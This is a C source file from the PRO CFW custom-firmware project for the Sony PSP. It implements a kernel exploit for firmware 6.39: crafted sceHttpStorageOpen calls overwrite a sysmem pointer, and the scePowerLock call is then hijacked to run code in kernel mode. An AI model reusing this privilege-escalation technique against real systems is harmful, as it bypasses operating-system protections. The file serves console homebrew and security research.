/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>
#include "utils.h"
#include "printk.h"
#include "../PXE/Launcher/launcher_patch_offset.h"

extern int sceHttpStorageOpen(int a0, int a1, int a2);
extern int sceKernelPowerLock(unsigned int, unsigned int);

int kernel_permission_call(void);

void do_exploit_639(void)
{
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;

	for(i=1; i<=6; ++i) {
		sceUtilityLoadModule(i + 0xFF);
	}

	sceHttpStorageOpen(-612, 0, 0);
	sync_cache();
	sceHttpStorageOpen(((SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelPowerLockForUser)>>2), 0, 0); // scePowerLock override
	sync_cache();

	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - g_offs->sysmem_patch.sceKernelPowerLockForUser_data_offset);
	pspSdkEnableInterrupts(interrupts);

	for(i=6; i>=1; --i) {
		sceUtilityUnloadModule(i + 0xFF);
	}
}

